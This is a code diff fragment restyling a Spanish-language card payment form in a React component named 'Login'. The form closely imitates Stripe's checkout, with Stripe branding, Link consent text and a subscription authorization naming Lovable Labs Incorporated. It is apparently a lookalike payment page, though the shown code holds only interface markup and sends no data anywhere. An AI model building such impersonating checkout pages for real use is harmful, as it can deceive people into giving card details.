+                  maxLength={40}
+                  aria-invalid={field === "holder"}
+                  className={`h-[48px] w-full rounded-[9px] border bg-white px-4 text-[17px] uppercase text-[#1a1a1a] outline-none transition-colors placeholder:normal-case placeholder:text-[#9b9b9b] focus:border-[#a8a8a8] ${field === "holder" ? "border-[#df1b41]" : "border-[#e5e5e5]"}`}
+                />
+
+                <p className="mb-2 mt-5 text-[14px] text-[#1a1a1a]">Dirección de facturación</p>
+
+                <div className={`overflow-hidden rounded-[9px] border bg-white ${field === "address" || field === "zip" ? "border-[#df1b41]" : "border-[#e5e5e5]"}`}>
+                  <div className="relative">
+                    <select
+                      id="country"
+                      value={country}
+                      onChange={(e) => setCountry(e.target.value)}
+                      className="h-[48px] w-full cursor-pointer appearance-none bg-white px-4 pr-12 text-[17px] text-[#1a1a1a] outline-none"
+                    >
+                      {COUNTRIES.map((c) => <option key={c} value={c}>{c}</option>)}
+                    </select>
+                    <ChevronDown className="pointer-events-none absolute right-[13px] top-1/2 h-[22px] w-[22px] -translate-y-1/2 text-[#1a1a1a]" strokeWidth={2} />
+                  </div>
+
+                  <div className="border-t border-[#e5e5e5]">
+                    <input
+                      id="address"
+                      type="text"
+                      placeholder="Línea 1 de dirección"
+                      value={address}
+                      onChange={(e) => setAddress(e.target.value)}
+                      autoComplete="street-address"
+                      maxLength={80}
+                      aria-invalid={field === "address"}
+                      className="h-[48px] w-full bg-transparent px-4 text-[17px] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
+                    />
+                  </div>
+
+                  <div className="flex h-[44px] items-center gap-3 border-t border-[#e5e5e5] pl-4 pr-[7px]">
+                    <input
+                      id="address2"
+                      type="text"
+                      placeholder="Línea 2 de dirección"
+                      value={address2}
+                      onChange={(e) => setAddress2(e.target.value)}
+                      autoComplete="address-line2"
+                      maxLength={80}
+                      className="h-full min-w-0 flex-1 bg-transparent text-[17px] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
+                    />
+                    <span className="shrink-0 rounded-[6px] border border-[#dcdcdc] px-[7px] py-[5px] text-[14px] leading-none text-[#8a8a8a]">Opcional</span>
+                  </div>
+
+                  <div className="border-t border-[#e5e5e5]">
+                    <input
+                      id="city"
+                      type="text"
+                      placeholder="Ciudad"
+                      value={city}
+                      onChange={(e) => setCity(e.target.value)}
+                      autoComplete="address-level2"
+                      maxLength={60}
+                      className="h-[48px] w-full bg-transparent px-4 text-[17px] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
+                    />
+                  </div>
+
+                  <div className="relative border-t border-[#e5e5e5]">
+                    <select
+                      id="department"
+                      value={department}
+                      onChange={(e) => setDepartment(e.target.value)}
+                      className={`h-[48px] w-full cursor-pointer appearance-none bg-white px-4 pr-12 text-[17px] outline-none ${department ? "text-[#1a1a1a]" : "text-[#9b9b9b]"}`}
+                    >
+                      <option value="">Departamento</option>
+                      {DEPARTMENTS.map((d) => <option key={d} value={d}>{d}</option>)}
+                    </select>
+                    <ChevronDown className="pointer-events-none absolute right-[13px] top-1/2 h-[22px] w-[22px] -translate-y-1/2 text-[#1a1a1a]" strokeWidth={2} />
+                  </div>
+
+                  <div className="border-t border-[#e5e5e5]">
+                    <input
+                      id="zip"
+                      type="text"
+                      placeholder="Código postal"
+                      value={zip}
+                      onChange={(e) => setZip(e.target.value.toUpperCase())}
+                      autoComplete="postal-code"
+                      inputMode="numeric"
+                      maxLength={10}
+                      aria-invalid={field === "zip"}
+                      className="h-[48px] w-full bg-transparent px-4 text-[17px] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
+                    />
+                  </div>
+                </div>
+
+                <label className="mt-[18px] flex cursor-pointer items-start gap-3">
+                  <span className="relative mt-[1px] flex h-[18px] w-[18px] shrink-0 items-center justify-center">
+                    <input
+                      type="checkbox"
+                      checked={save}
+                      onChange={(e) => setSave(e.target.checked)}
+                      className="peer h-[18px] w-[18px] cursor-pointer appearance-none rounded-[4px] border border-[#c9c9c9] bg-white transition-colors checked:border-[#111] checked:bg-[#111]"
+                    />
+                    <Check className="pointer-events-none absolute h-3 w-3 text-white opacity-0 peer-checked:opacity-100" strokeWidth={3.4} />
+                  </span>
+                  <span className="text-[15px] leading-[1.4] text-[#1a1a1a]">
+                    Guardar mi información de pago para futuras compras
+                  </span>
+                </label>
+
+                <div className="mt-[18px] flex items-center gap-3 border-t border-[#e5e5e5] pt-[18px]">
+                  <span className={`flex h-[18px] w-[18px] shrink-0 items-center justify-center rounded-full border bg-white ${method === "gpay" ? "border-[5.5px] border-[#111]" : "border-[1.5px] border-[#c9c9c9]"}`} aria-hidden="true" />
+                  <span className="flex items-center gap-2.5 text-[15px] text-[#1a1a1a]">
+                    <span className="flex h-[14px] items-center rounded-[3px] border border-[#111] bg-white px-[4px]">
+                      <AppleGlyph size={10} />
+                      <span className="ml-[1px] text-[10px] font-medium leading-none tracking-[-0.02em]">Pay</span>
+                    </span>
+                    Apple Pay
+                  </span>
                 </div>
               </div>
 
@@ -591,82 +840,56 @@ const Login = () => {
                 <p
                   role="alert"
                   style={{ animation: "vh-shake .3s ease-in-out" }}
-                  className="mt-2.5 flex items-start gap-1.5 text-[12.5px] leading-snug text-[#df1b41]"
+                  className="mt-3 flex items-start gap-1.5 text-[13px] leading-snug text-[#df1b41]"
                 >
                   <AlertCircle className="mt-[1px] h-3.5 w-3.5 shrink-0" /> {error}
                 </p>
               )}
 
-              <div className="mt-6">
-                <div className="flex items-center justify-between">
-                  <p className="text-[13px] font-medium text-[#30313d]">Datos de facturación</p>
-                  <span className="text-[11px] text-[#8d8e98]">Opcional</span>
-                </div>
-                <div className="mt-2 overflow-hidden rounded-[5px] border border-[#e6e6e6] bg-white shadow-[0_1px_1px_rgba(0,0,0,0.03)] focus-within:border-[#c8d1da]">
-                  <div className={cellCls}>
-                    <label htmlFor="country" className={labelCls}>País</label>
-                    <div className="relative">
-                      <select
-                        id="country"
-                        value={country}
-                        onChange={(e) => setCountry(e.target.value)}
-                        className={`${inputCls} cursor-pointer appearance-none pr-8`}
-                      >
-                        {COUNTRIES.map((c) => <option key={c} value={c}>{c}</option>)}
-                      </select>
-                      <ChevronDown className="pointer-events-none absolute right-0 top-1/2 h-4 w-4 -translate-y-1/2 text-[#6d6e78]" />
-                    </div>
-                  </div>
-                  <div className={`${cellCls} border-t border-[#f0f0f5]`}>
-                    <label htmlFor="address" className={labelCls}>Dirección</label>
+              <div className="mt-4 overflow-hidden rounded-[11px] border border-[#e5e5e5]">
+                <div className="px-[17px] pb-4 pt-[17px]">
+                  <p className="mb-2 text-[14px] text-[#1a1a1a]">Número de teléfono</p>
+                  <div className="flex h-[47px] items-center gap-2.5 rounded-[9px] border border-[#e5e5e5] pl-[10px] pr-[7px]">
+                    <HnFlag />
                     <input
-                      id="address"
-                      type="text"
-                      placeholder="Calle y número"
-                      value={address}
-                      onChange={(e) => setAddress(e.target.value)}
-                      autoComplete="street-address"
-                      maxLength={80}
-                      aria-invalid={field === "address"}
-                      className={`${inputCls} ${errCls(field === "address")}`}
+                      id="phone"
+                      type="tel"
+                      placeholder="9123-4567"
+                      value={phone}
+                      onChange={(e) => setPhone(e.target.value.replace(/[^\d-]/g, "").slice(0, 13))}
+                      autoComplete="tel"
+                      inputMode="tel"
+                      className="h-full min-w-0 flex-1 bg-transparent text-[17px] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
                     />
-                  </div>
-                  <div className={`${cellCls} border-t border-[#f0f0f5]`}>
-                    <label htmlFor="zip" className={labelCls}>Código postal</label>
-                    <input
-                      id="zip"
-                      type="text"
-                      placeholder="90210"
-                      value={zip}
-                      onChange={(e) => setZip(e.target.value.toUpperCase())}
-                      autoComplete="postal-code"
-                      inputMode="numeric"
-                      maxLength={10}
-                      aria-invalid={field === "zip"}
-                      className={`${inputCls} ${errCls(field === "zip")}`}
-                    />
+                    <span className="shrink-0 rounded-[6px] border border-[#dcdcdc] px-[7px] py-[5px] text-[14px] leading-none text-[#8a8a8a]">Opcional</span>
                   </div>
                 </div>
+                <p className="border-t border-[#e5e5e5] px-[17px] py-[15px] text-[15px] leading-[1.55] text-[#1a1a1a]">
+                  Al proporcionar mi número de teléfono, acepto crear una cuenta y guardar mi información de pago en Link, sujeto a las{" "}
+                  <span className="underline decoration-[#1a1a1a]/60 underline-offset-[3px]">Condiciones</span> y la{" "}
+                  <span className="underline decoration-[#1a1a1a]/60 underline-offset-[3px]">Política de privacidad</span>.
+                </p>
               </div>
-            </div>
 
-            <div className="shrink-0 border-t border-[#f0f0f5] bg-white px-5 pt-3 pb-[max(14px,env(safe-area-inset-bottom))]">
+              <p className="mt-6 px-3 text-center text-[15px] leading-[1.55] text-[#1a1a1a]">
+                Si te suscribes, autorizas a Lovable Labs Incorporated a cobrarte en {currency} a la tasa de cambio indicada o a la tasa de cambio vigente en el momento de la facturación, de acuerdo con las condiciones hasta su cancelación.
+              </p>
+
               <button
                 type="submit"
                 disabled={loading}
-                className="flex h-[52px] w-full items-center justify-center gap-2 rounded-[5px] bg-[#0570de] text-[16px] font-semibold text-white shadow-[0_1px_1px_rgba(0,0,0,0.08)] transition-all duration-150 hover:bg-[#0461c4] active:scale-[0.995] disabled:opacity-70"
+                className="mt-6 flex h-[52px] w-full items-center justify-center rounded-[9px] bg-[#5b4fe8] text-[17px] font-medium text-white transition-all duration-150 hover:bg-[#4f43dc] active:scale-[0.995] disabled:opacity-70"
               >
-                Pagar 2,00 US$
+                Suscribirse
               </button>
-              <p className="mt-2.5 flex items-center justify-center gap-1.5 text-[10.5px] text-[#8d8e98]">
-                <Lock className="h-2.5 w-2.5" />
-                <span className="flex items-center gap-1">
-                  Powered by <span className="font-semibold tracking-[-0.02em] text-[#635bff]">stripe</span>
+
+              <p className="mt-7 flex items-center justify-center gap-4 text-[15px] text-[#4a4a4a]">
+                <span className="flex items-center gap-1.5">
+                  Powered by <span className="text-[17px] font-bold tracking-[-0.045em] text-[#4a4a4a]">stripe</span>
                 </span>
-                <span className="text-[#d5d6dc]">|</span>
-                <span className="underline decoration-[#d5d6dc] underline-offset-2">Términos</span>
-                <span className="text-[#d5d6dc]">·</span>
-                <span className="underline decoration-[#d5d6dc] underline-offset-2">Privacidad</span>
+                <span className="h-[18px] w-px bg-[#d5d5d5]" />
+                <span>Condiciones</span>
+                <span>Privacidad</span>
               </p>
             </div>
           </form>
